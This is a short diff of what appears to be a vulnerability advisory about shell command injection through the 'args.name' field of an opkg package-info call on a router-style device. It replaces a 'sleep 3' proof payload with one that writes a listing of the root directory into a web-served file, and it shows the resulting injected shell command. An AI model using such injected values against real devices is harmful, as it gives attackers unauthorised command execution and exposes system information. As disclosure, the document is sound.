@@ -109,13 +109,13 @@ As a result, shell metacharacters supplied in `args.name` are interpreted by `/b
 Example injected value:
 
 ```text
-abc;sleep 3;#
+abc;ls / > /www/glc_get_package_info_ls_proof_20260507.txt;#
 ```
 
 Resulting shell interpretation:
 
 ```sh
-opkg --force-overwrite --nocase info abc;sleep 3;# >/tmp/opkg.stdout 2>/tmp/opkg.stderr;sync
+opkg --force-overwrite --nocase info abc;ls / > /www/glc_get_package_info_ls_proof_20260507.txt;# >/tmp/opkg.stdout 2>/tmp/opkg.stderr;sync
 ```
 
 The `;` terminates the intended `opkg info` command, and `#` comments out the original redirection and trailing `sync`.
